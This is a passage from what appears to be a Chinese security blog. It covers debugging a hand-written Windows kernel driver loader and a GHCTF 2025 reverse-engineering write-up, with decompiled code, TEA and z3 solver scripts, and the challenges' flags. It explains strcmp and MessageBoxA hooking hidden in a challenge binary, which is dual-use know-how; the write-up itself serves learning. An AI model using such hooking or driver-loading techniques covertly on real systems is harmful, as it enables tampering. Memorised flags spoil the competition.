pIrp-&gt;AssociatedIrp.SystemBuffer); //DbgBreakPoint(); PMEI myezio = (PMEI)pIrp-&gt;AssociatedIrp.SystemBuffer; switch (myezio-&gt;type) &#123; case 1: &#123; PMIB input = (PMIB)myezio-&gt;in; for (int i = 0; i &lt; input-&gt;len; i++) &#123; input-&gt;outstring[input-&gt;len - 1 - i] = input-&gt;initstring[i]; &#125; input-&gt;outstring[input-&gt;len] = 0; &#125; break; case 2: &#123; PMIB input = (PMIB)myezio-&gt;in; ULONG i, j = 0; for (i = 0; i &lt; input-&gt;len; i+=2) &#123; input-&gt;outstring[j++] = input-&gt;initstring[i]; &#125; for (i = 1; i &lt; input-&gt;len; i += 2) &#123; input-&gt;outstring[j++] = input-&gt;initstring[i]; &#125; input-&gt;outstring[j] = 0; &#125; break; default: break; &#125; //正确返回 pIrp-&gt;IoStatus.Status = STATUS_SUCCESS; pIrp-&gt;IoStatus.Information = io-&gt;Parameters.DeviceIoControl.OutputBufferLength; IoCompleteRequest(pIrp, IO_NO_INCREMENT); return STATUS_SUCCESS;&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path)&#123; NTSTATUS status = 0; ULONG uIndex = 0; PDEVICE_OBJECT pDeviceObj = NULL; UNICODE_STRING Devicename; UNICODE_STRING SymbolicLinkName; RtlInitUnicodeString(&amp;Devicename, DEVICE_NAME); status = IoCreateDevice(pDriver, 0, &amp;Devicename, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &amp;pDeviceObj); if (status != STATUS_SUCCESS) &#123; DbgPrint(&quot;创建设备失败! \\r\\n&quot;); return status; &#125; pDeviceObj-&gt;Flags |= DO_BUFFERED_IO; RtlInitUnicodeString(&amp;SymbolicLinkName, SYMBOLICLINK_NAME); status = IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;Devicename); if (status != STATUS_SUCCESS) &#123; DbgPrint(&quot;创建符号链接失败! \\r\\n&quot;); IoDeleteDevice(pDeviceObj); return status; &#125; pDriver-&gt;MajorFunction[IRP_MJ_CREATE] = Dispatch; pDriver-&gt;MajorFunction[IRP_MJ_CLOSE] = Dispatch; pDriver-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = myDispatch; pDriver-&gt;DriverUnload = DriverUnload; DbgPrint(&quot;[db]: Finish...\\r\\n&quot;); return STATUS_SUCCESS;&#125; 驱动加载 首先我的代码爆蓝屏了，总是蓝屏重启十分麻烦，所以第一个要学的就是异常捕捉 异常 12345678__try &#123; //... &#125; __except (EXCEPTION_EXECUTE_HANDLER)&#123; //...&#125; 像这样捕捉异常来避免蓝屏 分析 我的蓝屏发生在最后EntryPoint的地方，于是可以 12DbgPrintEx(77, 0, &quot;EntryPointFunc: %x\\n&quot;, EntryPointFunc);DbgBreakPoint(); 打印进入点，然后下断点，方便后续在windbg中操作 12345EntryPointFunc: 85854000Break instruction exception - code 80000003 (first chance)DLTools!LoadDriver+0xb6:a175f1fa cc int 3kd&gt; 停住之后我们可以u 85854000来观察字节码 1234567kd&gt; u 85854000 85854000 8bff mov edi,edi85854002 55 push ebp85854003 8bec mov ebp,esp85854005 e806000000 call 858540108585400a 5d pop ebp8585400b e9f0cfffff jmp 85851000 可以看到入口点是没有问题的，那么手动下断点运行过去 12kd&gt; bp 85854000kd&gt; g 最后发现是在85854010函数崩掉的，用ida查看源码 1234567INIT:00404000 8B FF mov edi, ediINIT:00404002 55 push ebpINIT:00404003 8B EC mov ebp, espINIT:00404005 E8 06 00 00 00 call ___security_init_cookieINIT:00404005INIT:0040400A 5D pop ebpINIT:0040400B E9 F0 CF FF FF jmp _DriverEntry@8 ; DriverEntry(x,x) 可以看到应该是在___security_init_cookie函数中崩了，进去发现 1mov dword ptr ds:[00403004h],eax 最后的赋值重定位表没有正确定位，找到问题原因了，是重定位表写的有问题 排查发现计算获得重定位表基址的时候+的是PIMAGE…而不是IMAGE PIMAGE_RELOC RelocationBlock = (PIMAGE_RELOC)((PUINT8)pImageReloc + sizeof(PIMAGE_BASE_RELOCATION));","updated":"2025-10-08T09:42:43.264Z","categories":[{"name":"逆向行驶","slug":"逆向行驶","permalink":"https://l1pmoluy.github.io/categories/%E9%80%86%E5%90%91%E8%A1%8C%E9%A9%B6/"}],"tags":[{"name":"windows深度学习","slug":"windows深度学习","permalink":"https://l1pmoluy.github.io/tags/windows%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}]},{"title":"ghctf2025-re-wp","date":"2025-04-09T13:13:14.000Z","path":"2025/04/09/2025ghctf/","text":"写了逆向方向7个题 ASM?Signin!汇编题，直接梭 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# 处理后的DATA1数组（经过DO1过程）processed_data1 = [ 0x26, 0x27, 0x24, 0x25, 0x3F, 0x27, 0x34, 0x11, 0x32, 0x33, 0x30, 0x00, 0x36, 0x37, 0x34, 0x35, 0x3A, 0x3B, 0x38, 0x39, 0x3E, 0x3F, 0x3C, 0x3D, 0x2A, 0x2B, 0x28, 0x00, 0x2E, 0x2F, 0x2C, 0x2D]# DATA2数组（加密后的目标数据）data2 = [ 0x69, 0x77, 0x77, 0x66, 0x73, 0x72, 0x4F, 0x46, 0x03, 0x47, 0x6F, 0x79, 0x07, 0x41, 0x13, 0x47, 0x5E, 0x67, 0x5F, 0x09, 0x0F, 0x58, 0x63, 0x7D, 0x5F, 0x77, 0x68, 0x35, 0x62, 0x0D, 0x0D, 0x50]# 解密每个块flag_bytes = []for i in range(8): # 获取DATA2的当前四字节块 e0, e1, e2, e3 = data2[i*4 : (i+1)*4] # 获取对应的处理后的DATA1块 d_block = processed_data1[i*4 : (i+1)*4] d1 = d_block[1] # 第二个字节用于异或e0 d2 = d_block[2] # 第三个字节用于异或e1和e2 d3 = d_block[3] # 第四个字节用于异或e3 # 异或解密 b0 = e0 ^ d1 b1 = e1 ^ d2 b2 = e2 ^ d2 b3 = e3 ^ d3 flag_bytes.extend([b0, b1, b2, b3])# 将字节转换为字符串flag = bytes(flag_bytes).decode(&#x27;utf-8&#x27;)print(flag)#NSSCTF&#123;W0w_y0u&#x27;re_g00d_@t_@5M!!&#125; FishingKithook+tea+z3 123456789101112131415161718192021222324252627282930313233343536373839int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v3; // rdx __int64 v4; // r8 __int64 v5; // rdx __int64 v6; // r8 __int64 v7; // rdx __int64 v8; // r8 __int64 v10; // rdx __int64 v11; // r8 char v13[24]; // [rsp+20h] [rbp-98h] BYREF char v14[56]; // [rsp+38h] [rbp-80h] BYREF char Str1[56]; // [rsp+70h] [rbp-48h] BYREF memset(v13, 0, 0x14ui64); memset(v14, 0, 0x32ui64); memset(Str1, 0, 0x32ui64); sub_140002FD0(&quot;Give me the bait:&quot;, argv, envp); sub_140003050(&quot;%s&quot;, v13); if ( sub_140001150((unsigned __int8 *)v13) ) &#123; sub_140002FD0(&quot;Yes!This bait is a good one.\\n\\n&quot;, v3, v4); sub_140002FD0(&quot;Give me the second thing:&quot;, v5, v6); sub_140003050(&quot;%s&quot;, v14); sub_140002FD0(&quot;\\nFishing...\\n\\n&quot;, v7, v8); Sleep(0x3E8u); sub_140002460(v14, Str1, v13); if ( strcmp(Str1, &amp;Str2) ) sub_140002FD0(&quot;Didn&#x27;t the fish take the bait?\\n&quot;, v10, v11); else sub_140002FD0(&quot;Did the fish take the bait?\\n&quot;, v10, v11); &#125; else &#123; sub_140002FD0(&quot;Oops...This bait is terrible.\\n&quot;, v3, v4); &#125; system(&quot;pause&quot;); return 0;&#125; 第一个是z3约束求解 12345678910111213141516171819202122232425262728293031from z3 import *# 定义 10 个整型变量，a0 表示 a0，其余 a1~a9a0, a1, a2, a3, a4, a5, a6, a7, a8, a9 = Ints(&#x27;a0 a1 a2 a3 a4 a5 a6 a7 a8 a9&#x27;)s = Solver()s.add( 202 * a8 + 216 * a5 - 4 * a4 - 330 * a9 - 13 * a4 - 268 * a6 == -14982, 325 * a8 + 195 * a0 + 229 * a1 - 121 * a6 - 409 * a6 - (a1 &lt;&lt; 7) == 22606, 489 * a1 + 480 * a6 + 105 * a2 + 367 * a3 - 135 * a4 - 482 * a9 == 63236, 493 * a1 - 80 * a4 - 253 * a8 - 121 * a2 - 177 * a0 - 243 * a9 == -39664, 275 * a4 + 271 * a6 + 473 * a7 - 72 * a5 - 260 * a4 - 367 * a4 == 14255, 286 * a0 + 196 * a7 + 483 * a2 + 442 * a1 - 495 * a8 - 351 * a4 == 41171, 212 * a2 + 283 * a7 - 329 * a8 - 429 * a9 - 362 * a2 - 261 * a6 == -90284, 456 * a5 + 244 * a7 + 92 * a4 + 348 * a7 - 225 * a1 - 31 * a2 == 88447, 238 * a9 + 278 * a7 + 216 * a6 + 237 * a0 + 8 * a2 - 17 * a9 == 83838, 323 * a9 + 121 * a1 + 370 * a7 - (a4 &lt;&lt; 6) - 196 * a9 - 422 * a0 == 26467, 166 * a9 + 90 * a1 + 499 * a2 + 301 * a8 - 31 * a2 - 206 * a2 == 88247, 355 * a0 + 282 * a4 + 44 * a9 + 359 * a8 - 167 * a5 - 62 * a3 == 76658, 488 * a6 + 379 * a9 + 318 * a2 - 85 * a1 - 357 * a2 - 277 * a5 == 35398, 40 * a0 + 281 * a4 + 217 * a5 - 241 * a1 - 407 * a7 - 309 * a7 == -35436, 429 * a3 + 441 * a3 + 115 * a1 + 96 * a8 + 464 * a1 - 133 * a7 == 157448 )# 求解约束if s.check() == sat: m = s.model() # 假设求解出来的 a0~a9 是 ASCII 码，将其转换为字符并拼接成字符串 flag = &#x27;&#x27;.join([chr(m[v].as_long()) for v in (a0, a1, a2, a3, a4, a5, a6, a7, a8, a9)]) print(&quot;Solution:&quot;, flag)else: print(&quot;No solution found&quot;) 后面的函数点进去像是魔改rc4 1234567891011121314151617181920212223__int64 __fastcall sub_140002460(const char *a1, __int64 a2, __int64 a3)&#123; __int64 result; // rax unsigned __int8 v4; // [rsp+20h] [rbp-18h] unsigned __int8 v5; // [rsp+21h] [rbp-17h] unsigned int i; // [rsp+24h] [rbp-14h] unsigned int v7; // [rsp+28h] [rbp-10h] v4 = 0; v5 = 0; sub_1400028B0(a3); v7 = strlen(a1); for ( i = 0; i &lt; v7; ++i ) &#123; v5 += byte_1400060C0[++v4]; sub_140002D90(&amp;byte_1400060C0[v4], &amp;byte_1400060C0[v5]); *(_BYTE *)(a2 + i) = byte_1400060C0[(unsigned __int8)(byte_1400060C0[v5] + byte_1400060C0[v4])] ^ a1[i]; *(_BYTE *)(a2 + i) ^= 0x14u; &#125; result = v7; *(_BYTE *)(a2 + v7) = 0; return result;&#125; 但是有问题，我在看交换函数sub_140002D90的时候发现了交叉引用 1234.rdata:0000000140004230 38 32 00 40 01 00 00 00 dq offset ?pre_cpp_initialization@@YAXXZ ; pre_cpp_initialization(void).rdata:0000000140004238 00 10 00 40 01 00 00 00 dq offset sub_140001000.rdata:0000000140004240 20 10 00 40 01 00 00 00 dq offset sub_140001020.rdata:0000000140004248 40 10 00 40 01 00 00 00 dq offset sub_140001040 他们的根源都是这个，并且可以猜到是init，初始化的时候调用的，sub_140001000点进去会发现 1234567891011121314151617181920212223char sub_140001AD0()&#123; int i; // [rsp+20h] [rbp-48h] int j; // [rsp+24h] [rbp-44h] HMODULE hModule; // [rsp+28h] [rbp-40h] FARPROC ProcAddress; // [rsp+30h] [rbp-38h] CHAR ProcName[8]; // [rsp+38h] [rbp-30h] BYREF CHAR ModuleName[16]; // [rsp+40h] [rbp-28h] BYREF qmemcpy(ModuleName, &quot;fpagqr`v=w&quot;, 10); ModuleName[10] = 127; ModuleName[11] = 127; ModuleName[12] = 0; for ( i = 0; i &lt; 12; ++i ) ModuleName[i] ^= 0x13u; hModule = GetModuleHandleA(ModuleName); //dll strcpy(ProcName, &quot;`gap~c&quot;); for ( j = 0; j &lt; 6; ++j ) ProcName[j] ^= 0x13u; ProcAddress = GetProcAddress(hModule, ProcName); //strcmp sub_140001C00(ProcAddress, sub_140001CE0); return 1;&#125; 第一个是dll的名字，第二个是strcmp函数，所以这里实现了对strcmp函数的hook，后续调用strcmp的时候实际上是调用了sub_140001CE0 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120__int64 __fastcall sub_140001CE0(_BYTE *a1, unsigned __int8 *a2)&#123; unsigned int v3; // [rsp+20h] [rbp-108h] unsigned int num; // [rsp+20h] [rbp-108h] unsigned int numa; // [rsp+20h] [rbp-108h] unsigned int v6; // [rsp+24h] [rbp-104h] unsigned int v7; // [rsp+24h] [rbp-104h] unsigned int v8; // [rsp+24h] [rbp-104h] unsigned int v9; // [rsp+28h] [rbp-100h] unsigned int v10; // [rsp+28h] [rbp-100h] unsigned int v11; // [rsp+28h] [rbp-100h] char v12; // [rsp+2Ch] [rbp-FCh] int i; // [rsp+30h] [rbp-F8h] int j; // [rsp+34h] [rbp-F4h] int ii; // [rsp+38h] [rbp-F0h] int jj; // [rsp+3Ch] [rbp-ECh] int kk; // [rsp+40h] [rbp-E8h] int mm; // [rsp+44h] [rbp-E4h] int nn; // [rsp+48h] [rbp-E0h] int v20; // [rsp+4Ch] [rbp-DCh] int k; // [rsp+50h] [rbp-D8h] int m; // [rsp+54h] [rbp-D4h] int n; // [rsp+58h] [rbp-D0h] HMODULE hModule; // [rsp+60h] [rbp-C8h] FARPROC ProcAddress; // [rsp+68h] [rbp-C0h] CHAR LibFileName[16]; // [rsp+70h] [rbp-B8h] BYREF CHAR ProcName[16]; // [rsp+80h] [rbp-A8h] BYREF char v28[3]; // [rsp+90h] [rbp-98h] BYREF char v29[11]; // [rsp+93h] [rbp-95h] BYREF char v30[8]; // [rsp+9Eh] [rbp-8Ah] BYREF char v31[32]; // [rsp+A8h] [rbp-80h] BYREF int v32[6]; // [rsp+C8h] [rbp-60h] BYREF int v33[14]; // [rsp+E0h] [rbp-48h] BYREF _BYTE *v34; // [rsp+130h] [rbp+8h] v34 = a1; memset(v32, 0, 0x14ui64); memset(v33, 0, 0x32ui64); for ( i = 0; i &lt; 20; ++i ) *((_BYTE *)v32 + i) = a1[i - 80]; for ( j = 0; j &lt; 50; ++j ) *((_BYTE *)v33 + j) = a1[j - 56]; v3 = 0; v6 = v33[0]; v9 = v33[1]; for ( k = 0; k &lt; 24; ++k ) &#123; v6 += (v32[v3 &amp; 3] + v3) ^ (v9 + ((v9 &gt;&gt; 5) ^ (16 * v9))); v3 += 1719109785; v9 += (v32[(v3 &gt;&gt; 11) &amp; 3] + v3) ^ (v6 + ((v6 &gt;&gt; 5) ^ (16 * v6))); &#125; v33[0] = v6; v33[1] = v9; num = 0; v7 = v33[2]; v10 = v33[3]; for ( m = 0; m &lt; 24; ++m ) &#123; v7 += (v32[num &amp; 3] + num) ^ (v10 + ((v10 &gt;&gt; 5) ^ (16 * v10))); num += 1719109785; v10 += (v32[(num &gt;&gt; 11) &amp; 3] + num) ^ (v7 + ((v7 &gt;&gt; 5) ^ (16 * v7))); &#125; v33[2] = v7; v33[3] = v10; numa = 0; v8 = v33[4]; v11 = v33[5]; for ( n = 0; n &lt; 24; ++n ) &#123; v8 += (v32[numa &amp; 3] + numa) ^ (v11 + ((v11 &gt;&gt; 5) ^ (16 * v11))); numa += 1719109785; v11 += (v32[(numa &gt;&gt; 11) &amp; 3] + numa) ^ (v8 + ((v8 &gt;&gt; 5) ^ (16 * v8))); &#125; v33[4] = v8; v33[5] = v11; v12 = 1; for ( ii = 0; ii &lt; 24; ++ii ) &#123; if ( byte_1400063C8[ii] != *((unsigned __int8 *)v33 + ii) ) &#123; v12 = 0; break; &#125; &#125; if ( v12 ) &#123; strcpy(LibFileName, &quot;dbtc\\&quot;#?u&#125;&#125;&quot;); for ( jj = 0; jj &lt; 10; ++jj ) LibFileName[jj] ^= 0x11u; hModule = LoadLibraryA(LibFileName); strcpy(ProcName, &quot;\\\\tbbpvtS~iP&quot;); for ( kk = 0; kk &lt; 11; ++kk ) ProcName[kk] ^= 0x11u; ProcAddress = GetProcAddress(hModule, ProcName); strcpy(v31, &quot;H~d6gt1rpdvye1p1sxv1wxby0&quot;); for ( mm = 0; mm &lt; 25; ++mm ) v31[mm] ^= 0x11u; qmemcpy(v28, &quot;R~&quot;, 2); v28[2] = 127; qmemcpy(v29, &quot;vcped&#125;pex~&quot;, 10); v29[10] = 127; strcpy(v30, &quot;000&quot;); for ( nn = 0; nn &lt; 17; ++nn ) v28[nn] ^= 0x11u; ((void (__fastcall *)(_QWORD, char *, char *, _QWORD))ProcAddress)(0i64, v31, v28, 0i64); &#125; while ( 1 ) &#123; v20 = (unsigned __int8)*v34 - *a2; if ( v20 || !*v34 ) break; ++v34; ++a2; &#125; if ( v20 &gt; 0 ) return 1i64; if ( v20 &gt;= 0 ) return 0i64; return 0xFFFFFFFFi64;&#125; 后面这个函数实际上就是实现了tea的魔改，三组就是24位刚好符合，key呢就是前面第一次的输入 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include&lt;Windows.h&gt;#include&lt;stdio.h&gt;//DeluxeBaitvoid detea(unsigned int* middle,unsigned int* key) &#123; unsigned int a1, a2; a1 = middle[0]; a2 = middle[1]; unsigned int v3 = 0; //for (int i = 0; i &lt; 24; ++i) //&#123; // a1 += (key[v3 &amp; 3] + v3) ^ (a2 + ((a2 &gt;&gt; 5) ^ (16 * a2))); // v3 += 1719109785; // a2 += ((key[(v3 &gt;&gt; 11) &amp; 3] + v3) ^ (a1 + ((a1 &gt;&gt; 5) ^ (16 * a1)))); //&#125; for (int i = 0; i &lt; 24; i++) &#123; v3 += 1719109785; &#125; for (int i = 0; i &lt; 24; ++i) &#123; a2 -= ((key[(v3 &gt;&gt; 11) &amp; 3] + v3) ^ (a1 + ((a1 &gt;&gt; 5) ^ (16 * a1)))); v3 -= 1719109785; a1 -= (key[v3 &amp; 3] + v3) ^ (a2 + ((a2 &gt;&gt; 5) ^ (16 * a2))); &#125; printf(&quot;%x %x\\n&quot;, a1, a2); middle[0] = a1; middle[1] = a2;&#125;int main() &#123; unsigned int flag[6] = &#123; 0xA6975621, 0xDEC4D51A, 0x4D829CA4, 0x56C845D1, 0x5C96B4A7, 0x2087494D &#125;; unsigned int key[]= &#123; 0x756C6544, 0x61426578, 0x00007469, 0x00000000, &#125;; unsigned int *middle; for (int i = 0; i &lt; 6; i+=2) &#123; middle = &amp;flag[i]; detea(middle, key); &#125; unsigned char a[24] = &#123; 0 &#125;; //char类型转换 for (int k = 0; k &lt; 6; k++) &#123; a[k * 4] = (flag[k]); a[k * 4 + 1] = (flag[k] &gt;&gt; 8); a[k * 4 + 2] = (flag[k] &gt;&gt; 16); a[k * 4 + 3] = (flag[k] &gt;&gt; 24); &#125; printf(&quot;%s&quot;, a); return 0;&#125;//DeluxeBait//NSSCTF&#123;Wh@t_@_b1g_F1sh&#125; 彩蛋，后面hook了MessageboxA LockedSecret upx改壳+32，而且和一般壳不太一样，我选择和ida配合手脱 12345678910111213141516171819202122232425262728293031int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+0h] [ebp-108h] char v5; // [esp+0h] [ebp-108h] int i; // [esp+0h] [ebp-108h] char Str[256]; // [esp+4h] [ebp-104h] BYREF memset(Str, 0, sizeof(Str)); sub_6D1050(Format, v4); sub_6D10C0(&quot;%32s&quot;, Str); if ( strlen(Str) != 32 ) &#123; sub_6D1050(aWrongLength, v5); system(Command); exit(0); &#125; sub_6D1100(); sub_6D1190((int *)Str); for ( i = 0; i &lt; 32; ++i ) &#123; if ( unk_6D4060[i] != Str[i] ) &#123; sub_6D1050(aWrong, i); system(aPause_0); exit(0); &#125; &#125; sub_6D1050(aRight, i); system(aPause_1); return 0;&#125; 第一个字写函数是造盒，用于初始化第二个函数里的key，第二个函数确实难看，提示说在Ghidra中查看 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465void __cdecl FUN_006d1190(int param_1)&#123; uint uVar1; uint uVar2; bool bVar3; uint local_34; int local_30; int local_2c; int local_28; int local_24; int local_20; byte local_1c [16]; char local_c; uint local_8; local_8 = DAT_006d4000 ^ (uint)&amp;stack0xfffffffc; local_1c._0_4_ = s_IamTheKeyYouKnow_006d3120._0_4_; local_1c._4_4_ = s_IamTheKeyYouKnow_006d3120._4_4_; local_1c._8_4_ = s_IamTheKeyYouKnow_006d3120._8_4_; local_1c._12_4_ = s_IamTheKeyYouKnow_006d3120._12_4_; local_c = s_IamTheKeyYouKnow_006d3120[0x10]; for (local_34 = 0; (int)local_34 &lt; 0xf; local_34 = local_34 + 1) &#123; uVar1 = local_34 &amp; 0x80000007; if ((int)uVar1 &lt; 0) &#123; uVar1 = (uVar1 - 1 | 0xfffffff8) + 1; &#125; local_1c[local_34] = local_1c[local_34] ^ (byte)*(undefined4 *)(&amp;DAT_006d43d8 + uVar1 * 4); &#125; local_2c = 0; local_28 = 0; local_24 = 0; local_20 = 0; memcpy(&amp;local_2c,local_1c,0x10); local_30 = 4; do &#123; uVar1 = *(uint *)(param_1 + 4 + (4 - local_30) * 8); uVar2 = (uVar1 * 0x10 + local_2c ^ uVar1 + 0x5e2377ff ^ (uVar1 &gt;&gt; 5) + local_28) + *(int *)(param_1 + (4 - local_30) * 8); uVar1 = (uVar2 * 0x10 + local_24 ^ uVar2 + 0x5e2377ff ^ (uVar2 &gt;&gt; 5) + local_20) + uVar1; uVar2 = (uVar1 * 0x10 + local_2c ^ uVar1 + 0xbc46effe ^ (uVar1 &gt;&gt; 5) + local_28) + uVar2; uVar1 = (uVar2 * 0x10 + local_24 ^ uVar2 + 0xbc46effe ^ (uVar2 &gt;&gt; 5) + local_20) + uVar1; uVar2 = (uVar1 * 0x10 + local_2c ^ uVar1 + 0x1a6a67fd ^ (uVar1 &gt;&gt; 5) + local_28) + uVar2; uVar1 = (uVar2 * 0x10 + local_24 ^ uVar2 + 0x1a6a67fd ^ (uVar2 &gt;&gt; 5) + local_20) + uVar1; uVar2 = (uVar1 * 0x10 + local_2c ^ uVar1 + 0x788ddffc ^ (uVar1 &gt;&gt; 5) + local_28) + uVar2; uVar1 = (uVar2 * 0x10 + local_24 ^ uVar2 + 0x788ddffc ^ (uVar2 &gt;&gt; 5) + local_20) + uVar1; uVar2 = (uVar1 * 0x10 + local_2c ^ uVar1 + 0xd6b157fb ^ (uVar1 &gt;&gt; 5) + local_28) + uVar2; uVar1 = (uVar2 * 0x10 + local_24 ^ uVar2 + 0xd6b157fb ^ (uVar2 &gt;&gt; 5) + local_20) + uVar1; uVar2 = (uVar1 * 0x10 + local_2c ^ uVar1 + 0x34d4cffa ^ (uVar1 &gt;&gt; 5) + local_28) + uVar2; uVar1 = (uVar2 * 0x10 + local_24 ^ uVar2 + 0x34d4cffa ^ (uVar2 &gt;&gt; 5) + local_20) + uVar1; uVar2 = (uVar1 * 0x10 + local_2c ^ uVar1 + 0x92f847f9 ^ (uVar1 &gt;&gt; 5) + local_28) + uVar2; uVar1 = (uVar2 * 0x10 + local_24 ^ uVar2 + 0x92f847f9 ^ (uVar2 &gt;&gt; 5) + local_20) + uVar1; uVar2 = (uVar1 * 0x10 + local_2c ^ uVar1 + 0xf11bbff8 ^ (uVar1 &gt;&gt; 5) + local_28) + uVar2; *(uint *)(param_1 + (4 - local_30) * 8) = uVar2 ^ 0xf; *(uint *)(param_1 + 4 + (4 - local_30) * 8) = (uVar2 * 0x10 + local_24 ^ uVar2 + 0xf11bbff8 ^ (uVar2 &gt;&gt; 5) + local_20) + uVar1 ^ 0xf; bVar3 = local_30 != 0; local_30 = local_30 + -1; &#125; while (bVar3); FUN_006d173b(local_8 ^ (uint)&amp;stack0xfffffffc); return;&#125; 一下就很好看了，是tea，常数是在模拟+&#x3D;delta，key的实现动调看，dump下来是0x423DF72D, 0x05F59A01, 0x633FCF1D, 0x77D19122 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;time.h&gt;#include&lt;stdint.h&gt;void detea(unsigned int* mi, unsigned int* key) &#123; unsigned int a1, a2; int a = 0; unsigned int num = 0; a1 = mi[0]^0xf; a2 = mi[1]^0xf; for (int i = 0; i &lt; 8; i++) &#123; num += 0x5e2377ff; &#125; printf(&quot;num=%x\\n&quot;, num); for (int i = 0; i &lt; 8; i++) &#123; a2 -= (a1 * 16 + key[2] ^ a1 + num ^ (a1 &gt;&gt; 5) + key[3]); a1 -= (a2 * 16 + key[0] ^ a2 + num ^ (a2 &gt;&gt; 5) + key[1]); num -= 0x5e2377ff; &#125; //for (int i = 0; i &lt; 8; i++) //&#123; // num += 0x5e2377ff; // printf(&quot;%x %x\\n&quot;, a1, a2); // a1 += (a2 * 16 + key[0] ^ a2 + num ^ (a2 &gt;&gt; 5) + key[1]); // a2 += (a1 * 16 + key[2] ^ a1 + num ^ (a1 &gt;&gt; 5) + key[3]); //&#125; printf(&quot;%x %x\\n&quot;, a1, a2); mi[0] = a1; mi[1] = a2;&#125;int main() &#123; unsigned int key[] = &#123; 0x423DF72D, 0x05F59A01, 0x633FCF1D, 0x77D19122 &#125;; unsigned int input[] = &#123; 0x031E45DC, 0x2776E989, 0x01234847, 0x64CED270, 0x33467FDA, 0xA34903B1, 0x2CD10027, 0x75BDB337 &#125;; unsigned int* middle; for (int i = 0; i &lt; 8; i += 2) &#123; middle = &amp;input[i]; detea(middle, key); &#125; unsigned char a[33] = &#123; 0 &#125;; //char类型转换 for (int k = 0; k &lt; 8; k++) &#123; a[k * 4] = (input[k]); a[k * 4 + 1] = (input[k] &gt;&gt; 8); a[k * 4 + 2] = (input[k] &gt;&gt; 16); a[k * 4 + 3] = (input[k] &gt;&gt; 24); &#125; printf(&quot;%s&quot;, a); //NSSCTF&#123;!!!Y0u_g3t_th3_s3cr3t!!!&#125; return 0;&#125; Mio？Ryo？Soyo？python文件，解密出来是引用自己的库 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import mathclass R85: Mbox = &quot;&quot;.join([chr(Miiooooooooo) for Miiooooooooo in range(33, 118)]) @staticmethod def M(M1: bytes) -&gt; str: M5 = &quot;&quot; M2 = (4 - len(M1) % 4) % 4 M1 += b&#x27;\\x00&#x27; * M2 for M7 in range(0, len(M1), 4): M6 = M1[M7[:M7 + 4]] M4 = int.from_bytes(M6, &quot;big&quot;) M3 = &quot;&quot; for _ in range(5): M3 = R85.Mbox[M4 % 85] + M3 M4 //= 85 else: M5 += M3 else: if M2: M5 = M5[None[:-M2]] return M5class R45: Rbox = &quot;&quot;.join([chr(RRRRouto) for RRRRouto in range(48, 93)]) @staticmethod def R(Rin: bytes) -&gt; str: Rout = [] Ri = 0 while Ri &lt; len(Rin): if Ri + 1 &lt; len(Rin): Rmi = Rin[Ri] &lt;&lt; 8 | Rin[Ri + 1] Rout.append(R45.Rbox[Rmi % 45]) Rmi //= 45 Rout.append(R45.Rbox[Rmi % 45]) Rmi //= 45 Rout.append(R45.Rbox[Rmi]) Ri += 2 else: Rmi = Rin[Ri] Rout.append(R45.Rbox[Rmi % 45]) Rmi //= 45 Rout.append(R45.Rbox[Rmi]) Ri += 1 return &quot;&quot;.join(Rout)def S(S2, num): Sre = [] for S1 in S2: if &quot;a&quot; &lt;= S1 &lt;= &quot;z&quot;: S3 = (ord(S1) - ord(&quot;a&quot;) + num) % 26 Sre.append(chr(ord(&quot;a&quot;) + S3)) elif &quot;0&quot; &lt;= S1 &lt;= &quot;9&quot;: S3 = (ord(S1) - ord(&quot;0&quot;) - num) % 10 Sre.append(chr(ord(&quot;0&quot;) + S3)) else: Sre.append(S1) else: return &quot;&quot;.join(Sre)sssssssssssss = bytes([57, 118, 33, 114, 68, 56, 117, 115, 34, 52, 52, 95, 78, 40, 49, 59, 95, 85, 63, 122, 54, 33, 77, 110, 49, 54, 34, 109, 106, 122, 60, 92, 108, 91, 61, 51, 42, 62, 35, 38, 52, 67, 62, 122, 116, 48, 76, 50, 67, 51, 59, 41, 122, 45, 45, 51, 90])def l(_: str): return S(R85.M(S(R45.R(_.encode()), 7).encode()), 9)from Secret import *if __name__ == &quot;__main__&quot;: print(&quot;输入:&quot;, end=&quot;&quot;) aaaaaaaaaaaaa = input() wwwwwwwwwww = l(aaaaaaaaaaaaa) if sssssssssssss == wwwwwwwwwww.encode(): print(&quot;哦，对的。&quot;) else: print(&quot;哎，并非。&quot;) input() 简单分析base45-&gt;凯撒-&gt;base85-&gt;凯撒，直接解密即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354# 反向偏移的函数def reverse_SSSooooyyooo(s: str, offset: int) -&gt; str: result = [] for char in s: if &#x27;a&#x27; &lt;= char &lt;= &#x27;z&#x27;: new_char = chr((ord(char) - ord(&#x27;a&#x27;) - offset) % 26 + ord(&#x27;a&#x27;)) result.append(new_char) elif &#x27;0&#x27; &lt;= char &lt;= &#x27;9&#x27;: new_char = chr((ord(char) - ord(&#x27;0&#x27;) + offset) % 10 + ord(&#x27;0&#x27;)) result.append(new_char) else: result.append(char) return &#x27;&#x27;.join(result)# 反向MMMMiiiiiio函数def reverse_MMMMiiiiiio(encoded_str: str, reverse_offset: int) -&gt; str: MMiiiiiiooo = &quot;&quot;.join([chr(Miiooooooooo) for Miiooooooooo in range(33, 118)]) decoded_bytes = [] for char in encoded_str: index = MMiiiiiiooo.find(char) if index != -1: decoded_bytes.append(index) decoded_str = bytes(decoded_bytes).decode(&#x27;utf-8&#x27;) return reverse_SSSooooyyooo(decoded_str, reverse_offset)# 反向RRRRyyooo函数def reverse_RRRRyyooo(encoded_str: 